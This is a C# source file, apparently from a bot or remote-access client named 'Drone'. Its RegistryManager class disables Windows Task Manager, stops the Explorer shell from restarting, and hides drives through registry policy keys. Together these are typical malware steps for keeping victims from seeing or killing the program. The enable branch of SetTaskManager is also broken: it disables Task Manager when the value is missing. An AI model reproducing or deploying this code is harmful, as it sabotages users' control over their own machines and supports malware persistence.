using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace Drone
{
    static class RegistryManager
    {
        public static void SetTaskManager(bool enable)
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (enable && objRegistryKey.GetValue("DisableTaskMgr") != null)
                objRegistryKey.DeleteValue("DisableTaskMgr");
            else
                objRegistryKey.SetValue("DisableTaskMgr", "1");
            objRegistryKey.Close();
        }

        public static void DisableWindowsShell()
        {
            RegistryKey ourKey = Registry.LocalMachine;
            ourKey = ourKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
            ourKey.SetValue("AutoRestartShell", 0);
        }
        public static void HideDrive(string drive)
        {
            string nodrive = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";
            RegistryKey rKey1 = Registry.CurrentUser.CreateSubKey(nodrive);

            //create DWORD 'NoDrives' with value 4. for hiding drive C
            rKey1.SetValue("NoDrives",
            Convert.ToInt32(drive, 16), RegistryValueKind.DWord);
            rKey1.Close();
        }
    }
}
